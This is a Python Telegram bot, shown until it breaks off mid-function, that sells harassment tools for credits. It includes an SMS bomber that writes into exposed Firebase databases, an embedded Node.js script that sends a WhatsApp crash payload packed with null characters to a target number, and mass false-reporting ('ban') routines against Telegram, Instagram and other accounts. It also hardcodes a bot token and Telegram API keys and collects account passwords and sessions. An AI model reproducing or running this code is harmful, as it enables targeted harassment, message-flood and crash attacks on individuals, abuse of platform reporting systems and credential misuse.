# ================================================================
#  [K] Dotbhai Ultimate Monster Bot - OSINT & BAN EDITION
# ================================================================

import asyncio, json, os, time, logging, random, string, html, urllib.parse, subprocess, shutil
from datetime import datetime
import aiohttp, requests, smtplib
from email.mime.text import MIMEText
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

from telethon import TelegramClient, functions, types
from telethon.errors import SessionPasswordNeededError
from instagrapi import Client as InstaClient

try:
    import qrcode
    HAS_QR = True
except ImportError:
    HAS_QR = False

BOT_TOKEN = "8594487296:AAFBDQq04O0vH01ByUH7okGNTE3NoTbYZV8"
OWNER_ID = 8646237754

API_POOL = [
    (33576198, "7b59cd4d6fed5c8aa9c794f204e25050", "IN Hanuman"),
    (36603675, "178e45d560ea6d3d45ef83603165f25b", "IN Shiv"),
    (34540299, "edf6ec574eb38bd1d60facca6ea360e2", "IN Krishna"),
    (31222438, "d17172a533c51807a7fc4f91bf73a5f5", "IN Laxmi"),
    (37955502, "0826f6dcedf65ea1bf90743f1a577cc4", "RU Russia"),
    (33312136, "528c3a422266cff9d8d7568896bdec3e", "RU Daddy"),
    (22015656, "23f9446294df969c87a4921a63f2c7c3", "RU Superhero"),
    (30787958, "d20dbf7672502bd1af9fa63080580a25", "RU Naruto"),
]

DATA_FILE = "bot_data.json"
SESSION_DIR = "sessions"
WA_SESSIONS_BASE = "wa_sessions"
os.makedirs(SESSION_DIR, exist_ok=True)
os.makedirs(WA_SESSIONS_BASE, exist_ok=True)CRASH_JS = """
const { default: makeWASocket, useMultiFileAuthState, fetchLatestWaWebVersion, delay } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const qrcode = require('qrcode-terminal');

const mode = process.argv[2];
const senderNum = process.argv[3];
const targetNum = process.argv[4];

const cleanSender = senderNum ? senderNum.replace(/[^0-9]/g, '') : '';
const sessionDir = path.join(__dirname, 'wa_sessions', cleanSender);

if (mode === '--qr' || mode === '--pair') {
    if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });
}

async function start() {
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestWaWebVersion();
    const sock = makeWASocket({
        version, logger: pino({ level: 'silent' }), auth: state, printQRInTerminal: false,
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });
    sock.ev.on('creds.update', saveCreds);

    if (mode === '--pair') {
        await delay(2000);
        try { const code = await sock.requestPairingCode(senderNum); console.log(`CODE:${code}`); }
        catch (e) { console.log(`ERROR:${e.message}`); }
        setTimeout(() => process.exit(0), 60000); 
    } 
    else if (mode === '--qr') {
        sock.ev.on('connection.update', async (update) => {
            const { qr, connection, lastDisconnect } = update;
            if (qr) { console.log(`QR:${qr}`); }
            if (connection === 'open') { console.log("SUCCESS"); setTimeout(() => process.exit(0), 3000); }
            if (connection === 'close') { console.log(`ERROR: Closed. Reason: ${lastDisconnect?.error?.output?.statusCode}`); setTimeout(() => process.exit(0), 2000); }
        });
    }
    else if (mode === '--crash') {
        sock.ev.on('connection.update', async (update) => {
            if (update.connection === 'open') {
                const targetJid = targetNum.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                try {
                    const msgId = '3EB0' + crypto.randomBytes(4).toString('hex').toUpperCase();
                    const payload = { viewOnceMessage: { message: { interactiveMessage: {
                        header: { title: 'CRASH', hasMediaAttachment: false }, body: { text: '\\u0000'.repeat(5000) },
                        nativeFlowMessage: { buttons: [{ name: 'review_and_pay', buttonParamsJson: '{"amount":999999}' }] }
                    } } } };
                    await sock.relayMessage(targetJid, payload, { messageId: msgId });
                    console.log("SUCCESS");
                } catch (e) { console.log("FAILED"); }
                setTimeout(() => process.exit(0), 2000);
            }
        });
    }
}
start();
"""

def setup_node_files():
    if not os.path.exists("wa_crash.js"):
        with open("wa_crash.js", "w") as f: f.write(CRASH_JS)
    if not os.path.exists("package.json"):
        pkg = {"dependencies": {"@whiskeysockets/baileys": "latest", "pino": "^10.3.0", "qrcode-terminal": "^0.12.0"}}
        with open("package.json", "w") as f: json.dump(pkg, f, indent=4)

setup_node_files()def default_data():
    return {
        "users": {}, "admins": [], 
        "channels": [
            {"id": "@trusteddealers_07", "link": "https://t.me/trusteddealers_07", "title": "Trusted Dealers 1"},
            {"id": "@trusteddealers07", "link": "https://t.me/trusteddealers07", "title": "Trusted Dealers 2"},
            {"id": "@trustmebaby07", "link": "https://t.me/trustmebaby07", "title": "Trust Me Baby"}
        ],
        "firebases": [], "api_urls": [], "tg_reports": [], "wa_reports": [],
        "wa_senders": [], "insta_senders": [], "fb_senders": [], "gmail_senders": [],
        "redeem_codes": {},
        "config": {"sms_cost": 2, "report_cost": 10, "wa_api_url": "", "wa_api_key": "", "osint_api": ""},
        "wa_otp": {}
    }

def load():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, "r") as f: 
                d = json.load(f)
                for k, v in default_data().items():
                    if k not in d: d[k] = v
                return d
        except: pass
    d = default_data()
    save(d)
    return d

def save(d):
    with open(DATA_FILE, "w") as f: json.dump(d, f, indent=2)

def reg_user(uid, name, d):
    if str(uid) not in d["users"]:
        d["users"][str(uid)] = {
            "name": name, "credits": 0, "premium_until": 0, 
            "ref_count": 0, "referrer_id": None, 
            "start_bonus_claimed": False, "referral_processed": False
        }

def is_admin(uid, d): return uid == OWNER_ID or uid in d.get("admins", [])

def is_premium(uid, d):
    u = d["users"].get(str(uid))
    if not u: return False
    if u["premium_until"] == "PERMANENT": return True
    return u.get("premium_until", 0) > time.time()

def get_prem_text(uid, d):
    u = d["users"].get(str(uid))
    if not u or u.get("premium_until", 0) == 0: return "❌ Free User"
    if u["premium_until"] == "PERMANENT": return "♾ Permanent Premium"
    return f"💎 Premium until {datetime.fromtimestamp(u['premium_until']).strftime('%Y-%m-%d')}"

def update_premium(uid, d):
    u = d["users"].get(str(uid))
    if not u: return
    n = u.get("ref_count", 0)
    cur = u.get("premium_until", 0)
    if n >= 50 and cur != "PERMANENT": u["premium_until"] = "PERMANENT"
    elif n >= 15 and cur != "PERMANENT":
        if cur < time.time(): u["premium_until"] = int(time.time() + (30 * 86400))def btn(text, cb): return InlineKeyboardButton(text=text, callback_data=cb)

def main_kb(uid, d):
    rows = [
        [btn("💥 SMS Bomb", "u:bomb"), btn("💥 WA Crash", "u:wa_crash")],
        [btn("📸 Insta Ban", "u:insta_ban"), btn("📘 FB Ban", "u:fb_ban")],
        [btn("📧 Gmail Ban", "u:gmail_ban"), btn("🚨 TG User Rep", "u:rep_tg")],
        [btn("📡 TG Channel Rep", "u:rep_tg_ch"), btn("💬 WA Report", "u:rep_wa")],
        [btn("🕵️ OSINT Info", "u:osint"), btn("💎 Premium", "u:premium")],
        [btn("💰 Credits", "u:credits"), btn("🎁 Redeem Code", "u:redeem")],
        [btn("🆘 Support", "u:support"), btn("❓ Help", "u:help")]
    ]
    if is_admin(uid, d): rows.append([btn("🛡 Admin Panel", "a:panel")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("➕ Add Admin", "a:add_adm"), btn("➖ Rm Admin", "a:rm_adm")],
        [btn("📢 Add Channel", "a:add_ch"), btn("🗑 Rm Channel", "a:rm_ch")],
        [btn("🔥 Add Firebase", "a:add_fb"), btn("🔗 Add API URL", "a:add_api")],
        [btn("📱 Add TG Report", "a:add_tg"), btn("💬 Add WA Number", "a:add_wa")],
        [btn("⚙ WA OTP API", "a:cfg_wa"), btn("⚙ Costs", "a:cfg_cost")],
        [btn("🕵️ OSINT API", "a:cfg_osint"), btn("👤 Give Credits", "a:add_cred")],
        [btn("💎 Give Premium", "a:add_prem"), btn("🎁 Generate Redeem", "a:gen_redeem")],
        [btn("📱 Link TG Account", "a:link_tg"), btn("📢 Broadcast", "a:broad")],
        [btn("📱 Link WA (Code)", "a:link_wa_code"), btn("📸 Link WA (QR)", "a:link_wa_qr")],
        [btn("📸 Link Insta", "a:link_insta"), btn("📘 Link FB", "a:link_fb")],
        [btn("📧 Link Gmail", "a:link_gmail"), btn("🗑 Logout Socials", "a:logout_social")],
        [btn("🗑 Logout WA", "a:logout_wa"), btn("📊 Stats", "a:stats")],
        [btn("⬅ Back", "m:home")]
    ])

def back_kb(dest="m:home"): return InlineKeyboardMarkup(inline_keyboard=[[btn("⬅ Back", dest)]])
def admin_back_kb(): return InlineKeyboardMarkup(inline_keyboard=[[btn("⬅ Admin", "a:panel")]])async def check_join(uid, d):
    missing = []
    for ch in d.get("channels", []):
        try:
            m = await bot.get_chat_member(ch["id"], uid)
            if m.status in ("left", "kicked"): missing.append(ch)
        except Exception as e:
            print(f"❌ ERROR CHECKING CHANNEL {ch['id']}: {e}")
            missing.append(ch)
    return missing

def join_kb(missing):
    rows = [[InlineKeyboardButton(text=f"📢 Join {c['title']}", url=c['link'])] for c in missing]
    rows.append([btn("✅ Check Again", "check_join")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

async def process_joined_user(uid, ref_arg, chat_id):
    d = load()
    uid_str = str(uid)
    user = d["users"].get(uid_str)
    if not user: return
    changed = False
    msg_text = ""

    if not user.get("start_bonus_claimed"):
        user["credits"] += 100
        user["start_bonus_claimed"] = True
        changed = True
        msg_text += "🎁 You received a 100 Credit bonus for joining!\n"

    if not user.get("referral_processed"):
        user["referral_processed"] = True
        if ref_arg and ref_arg.startswith("ref_") and not user.get("referrer_id"):
            try: ref_id = int(ref_arg.replace("ref_", ""))
            except: ref_id = None
            if ref_id and ref_id != uid and str(ref_id) in d["users"]:
                user["referrer_id"] = ref_id
                d["users"][str(ref_id)]["ref_count"] += 1
                d["users"][str(ref_id)]["credits"] += 200
                update_premium(str(ref_id), d)
                changed = True
                try: await bot.send_message(ref_id, f"🎉 New referral! +200 credits. Refs: {d['users'][str(ref_id)]['ref_count']}")
                except: pass

    if changed: save(d)
    text = f"👋 Welcome {user['name']}!\n{get_prem_text(uid, d)}\nCredits: {user['credits']}\n\n{msg_text}"
    await bot.send_message(chat_id, text, reply_markup=main_kb(uid, d))async def tg_fire_report(target, is_channel=False):
    sessions = [f for f in os.listdir(SESSION_DIR) if f.endswith('.session')]
    if not sessions: return 0, 0, "No TG accounts linked!"
    ok, fail = 0, 0
    target = target.strip()
    is_numeric = target.isdigit()

    for sess_file in sessions:
        sess_path = os.path.join(SESSION_DIR, sess_file)
        api_id, api_hash, _ = random.choice(API_POOL)
        client = TelegramClient(sess_path, api_id, api_hash)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                fail += 1
                await client.disconnect()
                continue
            
            ent = None
            if is_channel:
                clean_target = target.replace("https://t.me/", "").replace("http://t.me/", "").lstrip("@").split("/")[0]
                try: ent = await client.get_entity(clean_target)
                except Exception:
                    fail += 1
                    await client.disconnect()
                    continue
            else:
                if is_numeric:
                    try: ent = await client.get_entity(f"tg://user?id={target}")
                    except:
                        try: ent = await client.get_entity(int(target))
                        except:
                            fail += 1
                            await client.disconnect()
                            continue
                else:
                    clean_target = target.replace("https://t.me/", "").replace("http://t.me/", "").lstrip("@").split("/")[0]
                    try: ent = await client.get_entity(clean_target)
                    except Exception:
                        fail += 1
                        await client.disconnect()
                        continue

            peer = await client.get_input_entity(ent)
            try:
                await client(functions.account.ReportPeerRequest(peer=peer, reason=types.InputReportReasonSpam(), message="Spam/Scam Account"))
                ok += 1
            except:
                try:
                    await client(functions.messages.ReportRequest(peer=peer, id=[], option=types.InputReportReasonSpam(), message="Spam"))
                    ok += 1
                except: fail += 1
        except: fail += 1
        finally:
            await client.disconnect()
            await asyncio.sleep(random.uniform(2, 5))
    return ok, fail, Noneclass S(StatesGroup):
    add_adm = State(); add_ch = State(); add_fb = State(); add_api = State()
    add_tg = State(); add_wa = State(); cfg_wa = State(); cfg_cost = State(); cfg_osint = State()
    add_cred = State(); add_prem = State()
    bomb_num = State(); bomb_msg = State(); bomb_count = State()
    wa_crash = State(); link_wa_code = State(); link_wa_qr = State()
    insta_ban = State(); link_insta = State()
    fb_ban = State(); link_fb = State()
    gmail_ban = State(); link_gmail = State()
    osint = State()
    rep_tg = State(); rep_tg_ch = State(); rep_wa = State()
    wa_phone = State(); wa_otp = State()
    tg_phone = State(); tg_code = State(); tg_pass = State()
    support = State(); broadcast = State()
    redeem_code = State()
    gen_redeem_amount = State(); gen_redeem_uses = State()

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
R = Router()
dp.include_router(R)@R.message(CommandStart())
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    d = load()
    reg_user(msg.from_user.id, msg.from_user.full_name, d)
    save(d)
    args = msg.text.split()
    if len(args) > 1 and args[1].startswith("ref_"):
        await state.update_data(pending_ref=args[1])
    missing = await check_join(msg.from_user.id, d)
    if missing: 
        return await msg.answer("⚠️ <b>You must join our channels to use the bot!</b>\n\nJoin below and click 'Check Again' to claim your 100 Credit Bonus:", parse_mode="HTML", reply_markup=join_kb(missing))
    udata = await state.get_data()
    await process_joined_user(msg.from_user.id, udata.get("pending_ref"), msg.chat.id)

@R.callback_query(F.data == "check_join")
async def cb_check_join(cq: CallbackQuery, state: FSMContext):
    d = load()
    missing = await check_join(cq.from_user.id, d)
    if missing: 
        return await cq.answer("❌ You haven't joined all channels yet!", show_alert=True)
    await cq.message.delete()
    udata = await state.get_data()
    await process_joined_user(cq.from_user.id, udata.get("pending_ref"), cq.message.chat.id)

@R.callback_query(F.data == "m:home")
async def cb_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    text = f"🏠 Main Menu\n{get_prem_text(cq.from_user.id, d)}\nCredits: {d['users'][str(cq.from_user.id)]['credits']}"
    await cq.message.edit_text(text, reply_markup=main_kb(cq.from_user.id, d))

@R.callback_query(F.data == "u:help")
async def cb_help(cq: CallbackQuery):
    text = ("❓ <b>Help Menu</b>\n\n💥 <b>SMS Bomb</b>\n💥 <b>WA Crash</b>\n📸 <b>Insta Ban</b>\n📘 <b>FB Ban</b>\n📧 <b>Gmail Ban</b>\n🕵️ <b>OSINT Info</b>\n🚨 <b>TG Rep</b>\n💬 <b>WA Report</b>\n🎁 <b>Redeem</b>\n💎 <b>Premium</b>")
    await cq.message.edit_text(text, parse_mode="HTML", reply_markup=back_kb())

@R.callback_query(F.data == "u:premium")
async def cb_premium(cq: CallbackQuery):
    d = load()
    u = d["users"].get(str(cq.from_user.id))
    link = f"https://t.me/{(await bot.get_me()).username}?start=ref_{cq.from_user.id}"
    text = (f"💎 <b>Premium</b>\nStatus: {get_prem_text(cq.from_user.id, d)}\nRefs: {u.get('ref_count', 0)}\n\n🎁 15 Refs = 30 Days\n♾ 50 Refs = Permanent\n💰 +200 Credits per ref\n\n🔗 Link:\n<code>{link}</code>")
    await cq.message.edit_text(text, parse_mode="HTML", reply_markup=back_kb())

@R.callback_query(F.data == "u:credits")
async def cb_credits(cq: CallbackQuery):
    d = load()
    await cq.message.edit_text(f"💰 Credits: {d['users'][str(cq.from_user.id)]['credits']}", reply_markup=back_kb())@R.callback_query(F.data == "u:redeem")
async def cb_redeem(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text("🎁 <b>Redeem Code</b>\n\nSend your code:", parse_mode="HTML", reply_markup=back_kb())

@R.message(S.redeem_code)
async def msg_redeem(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    code = msg.text.strip().upper()
    await state.clear()
    d = load()
    if code not in d["redeem_codes"]:
        return await msg.answer("❌ Invalid code.", reply_markup=back_kb())
    code_data = d["redeem_codes"][code]
    if code_data["uses_left"] <= 0:
        return await msg.answer("❌ This code has expired.", reply_markup=back_kb())
    amount = code_data["amount"]
    d["redeem_codes"][code]["uses_left"] -= 1
    d["users"][str(msg.from_user.id)]["credits"] += amount
    save(d)
    await msg.answer(f"✅ <b>Code Redeemed!</b>\nYou received <b>{amount}</b> credits.", parse_mode="HTML", reply_markup=back_kb())

@R.callback_query(F.data == "a:gen_redeem")
async def cb_gen_redeem(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.gen_redeem_amount)
    await cq.message.edit_text("🎁 <b>Generate Redeem Code</b>\n\nHow many credits?", parse_mode="HTML", reply_markup=admin_back_kb())

@R.message(S.gen_redeem_amount)
async def msg_gen_redeem_amount(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send a number.")
    try: amount = int(msg.text)
    except: return await msg.answer("❌ Invalid number.")
    await state.update_data(redeem_amount=amount)
    await state.set_state(S.gen_redeem_uses)
    await msg.answer("How many times can this code be used?", reply_markup=admin_back_kb())

@R.message(S.gen_redeem_uses)
async def msg_gen_redeem_uses(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send a number.")
    try: uses = int(msg.text)
    except: return await msg.answer("❌ Invalid number.")
    await state.clear()
    data = await state.get_data()
    amount = data.get("redeem_amount", 100)
    code = "GIFT-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
    d = load()
    d["redeem_codes"][code] = {"amount": amount, "uses_left": uses}
    save(d)
    await msg.answer(f"✅ <b>Redeem Code Generated!</b>\n\nCode: <code>{code}</code>\nCredits: <b>{amount}</b>\nUses: <b>{uses}</b>", parse_mode="HTML", reply_markup=admin_back_kb())@R.callback_query(F.data == "u:support")
async def cb_support(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.support)
    await cq.message.edit_text("🆘 Send your message for the Owner:", reply_markup=back_kb())

@R.message(S.support)
async def msg_support(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Please send text only.")
    await state.clear()
    try:
        safe_text = html.escape(msg.text)
        uname = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
        await bot.send_message(OWNER_ID, f"🎫 Support from {msg.from_user.id} ({uname}):\n\n{safe_text}\n\nReply using:\n<code>/reply {msg.from_user.id} your message</code>", parse_mode="HTML")
        await msg.answer("✅ Message sent to Owner.", reply_markup=back_kb())
    except: await msg.answer("❌ Failed to send.", reply_markup=back_kb())

@R.message(Command("reply"))
async def cmd_reply(msg: Message):
    if not is_admin(msg.from_user.id, load()): return
    if not msg.text: return
    args = msg.text.split(maxsplit=2)
    if len(args) < 3: return await msg.answer("Usage: /reply <user_id> <message>")
    try:
        safe_text = html.escape(args[2])
        await bot.send_message(int(args[1]), f"📬 <b>Owner Reply:</b>\n\n{safe_text}", parse_mode="HTML")
        await msg.answer("✅ Reply sent.")
    except Exception as e: await msg.answer(f"❌ Error: {e}")@R.callback_query(F.data == "u:bomb")
async def cb_bomb(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not (is_premium(cq.from_user.id, d) or is_admin(cq.from_user.id, d)):
        return await cq.answer("💎 Premium required!", show_alert=True)
    if not d["firebases"] and not d["api_urls"]:
        return await cq.answer("⛔ No APIs configured.", show_alert=True)
    await state.set_state(S.bomb_num)
    await cq.message.edit_text("💥 <b>SMS Bomb</b>\n\nSend the target phone number:", parse_mode="HTML", reply_markup=back_kb())

@R.message(S.bomb_num)
async def msg_bomb_num(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    num = msg.text.strip()
    if not num.startswith("+"): num = "+" + num
    await state.update_data(b_num=num)
    await state.set_state(S.bomb_msg)
    await msg.answer(f"Target: <code>{num}</code>\n\nSend message text:", parse_mode="HTML", reply_markup=back_kb())

@R.message(S.bomb_msg)
async def msg_bomb_msg(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    await state.update_data(b_msg=msg.text)
    await state.set_state(S.bomb_count)
    await msg.answer("Message saved. Send count (Any number):", reply_markup=back_kb())

@R.message(S.bomb_count)
async def msg_bomb_count(msg: Message, state: FSMContext):
    d = load()
    if not msg.text: return await msg.answer("❌ Send a number.")
    try: count = int(msg.text)
    except: return await msg.answer("Send a valid number.")
    if count < 1: return await msg.answer("❌ Send a number > 0.")
    cost = count * d["config"]["sms_cost"]
    if not is_admin(msg.from_user.id, d) and d["users"][str(msg.from_user.id)]["credits"] < cost:
        return await msg.answer(f"💰 Need {cost} credits, you have {d['users'][str(msg.from_user.id)]['credits']}.")
    data = await state.get_data()
    b_msg, b_num = data.get("b_msg"), data.get("b_num")
    await state.clear()
    if not is_admin(msg.from_user.id, d):
        d["users"][str(msg.from_user.id)]["credits"] -= cost
        save(d)
    status_msg = await msg.answer(f"💥 Firing {count} SMS to {b_num}...")
    async def do_fire():
        ok, fail = 0, 0
        async with aiohttp.ClientSession() as sess:
            for _ in range(count):
                if d["api_urls"] and (not d["firebases"] or random.random() > 0.5):
                    url = random.choice(d["api_urls"])
                    try:
                        async with sess.post(url, json={"message": b_msg, "to": b_num, "phone": b_num}, timeout=5) as r:
                            if r.status < 500: ok += 1
                            else: fail += 1
                    except: fail += 1
                elif d["firebases"]:
                    url = random.choice(d["firebases"])
                    try:
                        async with sess.get(f"{url}/clients.json?shallow=true", timeout=5) as r:
                            devs = await r.json()
                            if devs:
                                dev_id = random.choice(list(devs.keys()))
                                payload = {"from": 0, "to": b_num, "message": b_msg, "isSended": False, "timestamp": int(time.time())}
                                async with sess.put(f"{url}/clients/{dev_id}/webhookEvent/sendSms.json", json=payload, timeout=5) as pr:
                                    if pr.status == 200: ok += 1
                                    else: fail += 1
                            else: fail += 1
                    except: fail += 1
                await asyncio.sleep(0.1)
        await status_msg.edit_text(f"💥 <b>Bomb Done</b>\nTarget: {b_num}\n✅ Success: {ok}\n❌ Failed: {fail}", parse_mode="HTML")
    asyncio.create_task(do_fire())@R.callback_query(F.data == "u:wa_crash")
async def cb_wa_crash(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not (is_premium(cq.from_user.id, d) or is_admin(cq.from_user.id, d)):
        return await cq.answer("💎 Premium required!", show_alert=True)
    if not d["wa_senders"]:
        return await cq.answer("⛔ Admin hasn't linked any WA numbers yet!", show_alert=True)
    await state.set_state(S.wa_crash)
    await cq.message.edit_text("💥 <b>WhatsApp Crash</b>\n\nSend the target phone number:", parse_mode="HTML", reply_markup=back_kb())

@R.message(S.wa_crash)
async def msg_wa_crash(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    await state.clear()
    d = load()
    target_num = msg.text.strip()
    if not d["wa_senders"]: return await msg.answer("⛔ No WA senders linked.")
    sender = random.choice(d["wa_senders"])
    status_msg = await msg.answer(f"💥 Firing WA crash on <code>{target_num}</code>...", parse_mode="HTML")
    def run_js():
        try:
            result = subprocess.run(['node', 'wa_crash.js', '--crash', sender, target_num], capture_output=True, text=True, timeout=15)
            if "SUCCESS" in result.stdout: return True
            return False
        except Exception as e:
            logging.error(f"JS Error: {e}")
            return False
    success = await asyncio.to_thread(run_js)
    if success:
        await status_msg.edit_text(f"✅ <b>Crash Payload Sent!</b>", parse_mode="HTML")
    else:
        await status_msg.edit_text(f"❌ <b>Failed to send crash.</b>\nSender might be banned.", parse_mode="HTML")

@R.callback_query(F.data == "a:link_wa_code")
async def cb_link_wa_code(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.link_wa_code)
    await cq.message.edit_text("📱 Send a WhatsApp number (e.g., 919876543210):", parse_mode="HTML", reply_markup=admin_back_kb())

@R.message(S.link_wa_code)
async def msg_link_wa_code(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    num = "".join(c for c in msg.text if c.isdigit())
    if len(num) < 10: return await msg.answer("❌ Invalid number.")
    await state.clear()
    d = load()
    if num in d["wa_senders"]:
        return await msg.answer("⚠️ Already linked!", reply_markup=admin_back_kb())
    status_msg = await msg.answer("⏳ Generating Pairing Code...")
    async def get_code():
        try:
            proc = await asyncio.create_subprocess_exec('node', 'wa_crash.js', '--pair', num, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            import time
            start_time = time.time()
            while time.time() - start_time < 15:
                line = await proc.stdout.readline()
                if not line: break
                line_str = line.decode().strip()
                if line_str.startswith("CODE:"):
                    proc.terminate()
                    return line_str.replace("CODE:", "").strip()
                elif line_str.startswith("ERROR:"):
                    proc.terminate()
                    return f"ERROR: {line_str}"
            proc.terminate()
            err = await proc.stderr.read()
            return f"FAILED: {err.decode()[:200]}"
        except Exception as e:
            return str(e)
    code = await get_code()
    if code and not code.startswith("ERROR") and not code.startswith("FAILED"):
        d["wa_senders"].append(num)
        save(d)
        await status_msg.edit_text(f"✅ <b>Pairing Code:</b> <code>{code}</code>", parse_mode="HTML")
    else:
        await status_msg.edit_text(f"❌ Failed to get code:\n<code>{code}</code>", parse_mode="HTML")

@R.callback_query(F.data == "a:link_wa_qr")
async def cb_link_wa_qr(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.link_wa_qr)
    await cq.message.edit_text("📸 Send a WhatsApp number (e.g., 919876543210):", parse_mode="HTML", reply_markup=admin_back_kb())

@R.message(S.link_wa_qr)
async def msg_link_wa_qr(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    num = "".join(c for c in msg.text if c.isdigit())
    if len(num) < 10: return await msg.answer("❌ Invalid number.")
    await state.clear()
    d = load()
    if num in d["wa_senders"]:
        return await msg.answer("⚠️ Already linked!", reply_markup=admin_back_kb())
    status_msg = await msg.answer("⏳ Generating QR Code...")
    async def run_qr():
        proc = await asyncio.create_subprocess_exec('node', 'wa_crash.js', '--qr', num, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
        import time
        start_time = time.time()
        qr_sent = False
        while time.time() - start_time < 60:
            line = await proc.stdout.readline()
            if not line: break
            line_str = line.decode().strip()
            if line_str.startswith("QR:"):
                qr_data = line_str.replace("QR:", "").strip()
                qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=400x400&data={urllib.parse.quote(qr_data)}"
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(qr_url) as resp:
                            if resp.status == 200:
                                img_data = await resp.read()
                                photo = BufferedInputFile(img_data, filename="qr.jpg")
                                await status_msg.edit_text("📸 <b>Scan this QR Code within 60 seconds:</b>", parse_mode="HTML")
                                await bot.send_photo(msg.chat.id, photo=photo)
                                qr_sent = True
                            else:
                                await status_msg.edit_text(f"⚠️ Failed to load image. <a href='{qr_url}'>Click here to scan QR</a>", parse_mode="HTML")
                except Exception:
                    await status_msg.edit_text(f"⚠️ Network error. <a href='{qr_url}'>Click here to scan QR</a>", parse_mode="HTML")
            elif line_str.startswith("ERROR:"):
                await status_msg.edit_text(f"❌ WhatsApp Error: <code>{line_str}</code>", parse_mode="HTML")
                proc.terminate()
                return
            elif line_str == "SUCCESS":
                proc.terminate()
                d["wa_senders"].append(num)
                save(d)
                await status_msg.edit_text(f"✅ <b>WhatsApp Linked!</b>", parse_mode="HTML")
                return
        proc.terminate()
        if not qr_sent:
            await status_msg.edit_text("❌ Failed to generate QR code. WhatsApp blocked the connection.", parse_mode="HTML")
    asyncio.create_task(run_qr())@R.callback_query(F.data == "u:insta_ban")
async def cb_insta_ban(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not (is_premium(cq.from_user.id, d) or is_admin(cq.from_user.id, d)):
        return await cq.answer("💎 Premium required!", show_alert=True)
    if not d["insta_senders"]:
        return await cq.answer("⛔ No Instagram accounts linked!", show_alert=True)
    await state.set_state(S.insta_ban)
    await cq.message.edit_text("📸 <b>Instagram Ban</b>\n\nSend the target's <b>@username</b>:", parse_mode="HTML", reply_markup=back_kb())

@R.message(S.insta_ban)
async def msg_insta_ban(msg: Message, state: FSMContext):
    if not msg.text: return await msg.answer("❌ Send text only.")
    target = msg.text.strip().replace("@", "")
    await state.clear()
    d = load()
    senders = d["insta_senders"]
    status_msg = await msg.answer(f"💀 Firing Instagram reports on <code>{target}</code>...", parse_mode="HTML")
    def do_insta_report():
        ok, fail = 0, 0
        try: target_id = InstaClient().user_id_from_username(target)
        except: target_id = target
        for acc in senders:
            try:
                cl = InstaClient()
                cl.load_settings(acc["session"])
                cl.login(acc["user"], "")
                cl.private_request(f"users/{target_id}/flag_user/", data={"reason_id": 1, "source_name": ""})
                ok += 1
                time.sleep(random.uniform(2, 5))
            except Exception as e:
                print(f"Insta Error: {e}")
                fail += 1
        return ok, fail
    ok, fail = await asyncio.to_thread(do_insta_report)
    await status_msg.edit_text(f"✅ <b>Insta Report Finished</b>\nTarget: @{target}\nSuccess: {ok}\nFailed: {fail}", parse_mode="HTML")

@R.callback_query(F.data == "a:link_insta")
async def cb_link_insta(cq: CallbackQuery, state: FSMContext):
    if not is_admin(cq.from_user.id, load()): return
    await state.set_state(S.link_insta)
    await cq.message.edit_text("📸 Send Instagram login:\n<code>username:password</code>", parse_mode="HTML", reply_markup=admin_back_kb())

@R.message(S.link_insta)
async def msg_link_insta(msg: Message, state: FSMContext):
    if not msg.text or ":" not in msg.text: return await msg.answer("❌ Use username:password")
    user, pwd = msg.text.split(":", 1)
    status_msg = await msg.answer("⏳ Logging into Instagram...")
    def login_insta():
        try:
            cl = InstaClient()
            cl.login(user.strip(), pwd.strip())
            session_file = f"insta_{user.strip()}.json"
            cl.dump_settings(session_file)
            return True, session_file
        except Exception as e: return False, str(e)
    success, res = await asyncio.to_thread(login_insta)
    if success:
        d = load()
        d["insta_senders"].append({"user": user.strip(), "session": res})
        save(d)
